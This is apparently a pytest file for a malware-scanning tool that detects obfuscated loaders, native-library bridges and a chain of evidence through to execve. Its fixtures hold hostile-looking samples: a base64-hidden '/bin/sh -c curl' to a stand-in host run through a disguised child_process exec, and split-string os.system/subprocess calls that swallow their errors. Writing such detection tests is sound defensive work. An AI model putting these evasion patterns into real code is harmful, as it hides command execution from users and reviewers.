import base64
import hashlib
import json

from app.scan import binary_evidence as binary
from app.scan.forensic_chain import run_forensic_investigation
from app.scan.obfuscation_delta import analyze_js_obfuscation
from tests.test_binary_evidence import archive, elf


def _ghidra_v2_plugin_report(elf_bytes: bytes) -> bytes:
    digest = hashlib.sha256(elf_bytes).hexdigest()
    payload = {
        "version": 1,
        "scope": "binary_static",
        "profile": binary.PROFILE,
        "status": "completed",
        "reason": "static_export_completed",
        "artifact": {"sha256": digest, "bytes": len(elf_bytes), "format": "ELF64LE", "machine": 62},
        "provider": {
            "name": "ghidra",
            "version": binary.GHIDRA_VERSION,
            "java_major": 25,
            "java_version": "25.0.1",
            "distribution_sha256": binary.DISTRIBUTION_SHA256,
            "exporter_sha256": binary.EXPORTER_SHA256,
        },
        "facts": {
            "version": 2,
            "ghidra_version": binary.GHIDRA_VERSION,
            "executable_sha256": digest,
            "executable_format": "Executable and Linking Format (ELF)",
            "language_id": "x86:LE:64:default",
            "compiler_spec_id": "gcc",
            "image_base": "ram:00400000",
            "analysis_timed_out": False,
            "truncated": False,
            "functions": [
                {
                    "entry": "ram:00401000",
                    "name": "init_bridge",
                    "body_addresses": 40,
                    "basic_blocks": 2,
                    "cfg_edges": 1,
                    "indirect_calls": 0,
                    "is_thunk": False,
                },
                {
                    "entry": "ram:00401050",
                    "name": "hidden_exec",
                    "body_addresses": 28,
                    "basic_blocks": 1,
                    "cfg_edges": 0,
                    "indirect_calls": 0,
                    "is_thunk": False,
                },
            ],
            "imports": [
                {"library": "libc.so.6", "name": "execve", "external_location": "EXTERNAL:00000001"},
            ],
            "exports": [
                {"entry": "ram:00401000", "name": "init_bridge"},
            ],
            "call_edges": [
                {"caller": "ram:00401000", "target": "ram:00401050", "target_kind": "internal"},
                {"caller": "ram:00401050", "target": "EXTERNAL:00000001", "target_kind": "import"},
            ],
        },
        "runtime_verified": False,
        "automatic_patch": False,
        "limitations": list(binary.PRODUCER_LIMITATIONS),
    }
    return json.dumps(payload).encode("utf-8")


def test_js_llm_obfuscation_and_native_addon_bridge_are_detected():
    b64 = base64.b64encode(b"/bin/sh -c curl http://example.invalid").decode("ascii")
    js_code = f"""
if (false) {{
  const decoy = 1;
}}
export function boot() {{
  try {{
    const addon = require("./native/" + "agent_hook.node");
    const cmd = Buffer.from("{b64}", "base64").toString();
    const cp = require("child_" + "process");
    cp["ex" + "ec"](cmd);
    return addon;
  }} catch (err) {{}}
}}
""".encode("utf-8")

    res = analyze_js_obfuscation(js_code, file_path="src/boot.ts")
    assert res["status"] == "completed"
    kinds = {s["kind"] for s in res["signals"]}
    assert {
        "constant_branch_guard",
        "encoded_sensitive_constant",
        "dynamic_import_sink",
        "computed_member_sink",
        "silent_exception_swallow",
    } <= kinds
    assert res["delta_score"] >= 15
    assert res["ffi_targets"][0]["library_arg"] == "./native/agent_hook.node"


def test_end_to_end_forensic_chain_links_obfuscated_python_ffi_to_ghidra_execve():
    elf_bytes = elf(b"\x90" * 32)
    py_loader = b"""
import ctypes

def run():
    try:
        mod = __import__("sub" + "process")
        bridge = ctypes.CDLL("./native/" + "libhook.so")
        return bridge.init_bridge()
    except Exception:
        pass
"""
    raw_zip = archive({
        "pkg/loader.py": py_loader,
        "native/libhook.so": elf_bytes,
    })
    bound_zip = binary.attach_binary_reports(
        raw_zip, [("native/libhook.so", _ghidra_v2_plugin_report(elf_bytes))]
    )

    result = run_forensic_investigation(bound_zip, engine_version="test-forensic-v1")
    assert result["status"] == "completed"
    assert result["runtime_verified"] is False
    assert result["automatic_patch"] is False

    # Verify cryptographic SHA-256 hand-off chain across all 4 roles.
    receipts = result["forensic_chain"]["receipts"]
    assert [r["role"] for r in receipts] == ["detector", "researcher", "correlator", "verifier"]
    for idx in range(1, len(receipts)):
        assert receipts[idx]["input_sha256"] == receipts[idx - 1]["output_sha256"]
        assert receipts[idx]["depends_on"] == receipts[idx - 1]["output_sha256"]

    # Verify cross-boundary link from pkg/loader.py -> native/libhook.so -> execve.
    assert len(result["cross_boundary_chains"]) == 1
    chain = result["cross_boundary_chains"][0]
    assert chain["source_file"] == "pkg/loader.py"
    assert chain["binary_path"] == "native/libhook.so"
    assert chain["reachable_sensitive_imports"][0]["import_name"] == "execve"

    obs_kinds = {o["kind"] for o in result["forensic_observations"]}
    assert "obfuscated_ffi_to_sensitive_binary_sink" in obs_kinds


def test_clean_project_produces_completed_forensic_chain_with_zero_observations():
    clean_zip = archive({"app/main.py": b"def add(a: int, b: int) -> int:\n    return a + b\n"})
    result = run_forensic_investigation(clean_zip, engine_version="test-forensic-v1")
    assert result["status"] == "completed"
    assert result["cross_boundary_chains"] == []
    assert result["forensic_observations"] == []


def test_kev_matches_correlate_with_obfuscated_source():
    py_evasive = b"""
import subprocess as sp
def run():
    try:
        runner = sp.Popen
        fn = getattr(__import__("o" + "s"), "sys" + "tem")
        return runner, fn
    except Exception:
        pass
"""
    raw_zip = archive({"app/loader.py": py_evasive})
    fake_threat = {
        "schema": 1,
        "status": "completed",
        "matches": [{"cve_id": "CVE-2026-99999", "priority": "expedited", "reason": "known_exploitation"}],
    }
    res = run_forensic_investigation(raw_zip, engine_version="test", precomputed_threat=fake_threat)
    kinds = {o["kind"] for o in res["forensic_observations"]}
    assert "kev_exposure_with_obfuscated_code_dna" in kinds
    kev_obs = next(o for o in res["forensic_observations"] if o["kind"] == "kev_exposure_with_obfuscated_code_dna")
    assert kev_obs["kev_cve_ids"] == ["CVE-2026-99999"]


def test_local_cli_forensics_command_runs_offline_and_enforces_observation_gate(tmp_path, capsys):
    from app import local_cli

    project_dir = tmp_path / "proj"
    project_dir.mkdir()
    elf_bytes = elf(b"\x90" * 16)
    (project_dir / "native").mkdir()
    (project_dir / "native" / "libhook.so").write_bytes(elf_bytes)
    (project_dir / "loader.py").write_bytes(
        b"import ctypes\n"
        b"def f():\n"
        b"    try:\n"
        b"        m = __import__('sub' + 'process')\n"
        b"        return ctypes.CDLL('./native/' + 'libhook.so').init_bridge()\n"
        b"    except Exception:\n"
        b"        pass\n"
    )
    report_file = tmp_path / "ghidra_v2.json"
    report_file.write_bytes(_ghidra_v2_plugin_report(elf_bytes))
    state_dir = tmp_path / "state"

    code = local_cli.main([
        "--state-dir", str(state_dir),
        "forensics", str(project_dir),
        "--binary-evidence", f"native/libhook.so={report_file}",
        "--fail-on-observations",
        "--json",
    ])
    assert code == 1
    bundle = json.loads(capsys.readouterr().out)
    assert bundle["status"] == "completed"
    assert any(o["kind"] == "obfuscated_ffi_to_sensitive_binary_sink" for o in bundle["forensic_observations"])


def test_hunt_exploit_dna_extracts_invariant_fingerprint_offline():
    import importlib.util
    from pathlib import Path
    import sys

    script_path = Path(__file__).resolve().parent.parent / "scripts" / "hunt_exploit_dna.py"
    spec = importlib.util.spec_from_file_location("hunt_exploit_dna", script_path)
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    sys.modules["hunt_exploit_dna"] = mod
    spec.loader.exec_module(mod)

    variants = [
        "import ctypes\ndef a():\n    try:\n        lib = ctypes.CDLL('./a/' + 'b.so')\n"
        "        x = getattr(__import__('o'+'s'), 'sys'+'tem')\n    except Exception:\n        pass\n",
        "import ctypes as c\ndef b():\n    try:\n        h = c.CDLL('lib' + 'x.so')\n"
        "        y = getattr(__import__('sub'+'process'), 'Po'+'pen')\n    except:\n        pass\n",
    ]
    prof = mod.profile_bodies(variants, language="python", filename="sample.py")
    assert prof["unique_parseable"] == 2
    assert prof["detected"] == 2
    assert prof["detection_rate"] == 1.0
    assert set(prof["invariant_signals"]) >= {
        "dynamic_getattr_sink",
        "dynamic_import_sink",
        "silent_exception_swallow",
        "split_sensitive_literal",
    }


def test_ffi_matcher_resolves_posix_lib_prefix_and_cpython_wheel_abi_names():
    from app.scan.forensic_chain import _match_ffi_to_artifact

    artifacts = [
        "native/libhook.so",
        "pkg/_crypto_accel.cpython-312-x86_64-linux-gnu.so",
        "other/libunrelated.so",
    ]
    assert _match_ffi_to_artifact("./native/hook.so", artifacts) == ["native/libhook.so"]
    assert _match_ffi_to_artifact("crypto_accel", artifacts) == [
        "pkg/_crypto_accel.cpython-312-x86_64-linux-gnu.so"
    ]
    assert _match_ffi_to_artifact("other_dir/hook.so", artifacts) == []

def test_pure_silent_exception_swallow_and_benchmarks_do_not_trigger_high_obfuscation_observation():
    swallows = "\n".join(
        f"def f{i}():\n    try:\n        return {i}\n    except Exception:\n        pass\n"
        for i in range(7)
    )
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("pkg/core.py", swallows)
        zf.writestr(
            "pkg/benchmarks/bench_heavy.py",
            "x = getattr(__import__('o'+'s'), 'sys'+'tem')\n",
        )
    zbytes = buf.getvalue()
    res = run_forensic_investigation(zbytes, engine_version="test-cal-v1")
    assert res["code_dna"]["files_analyzed"] == 1
    assert not any(o["kind"] == "high_obfuscation_delta_source" for o in res["forensic_observations"])
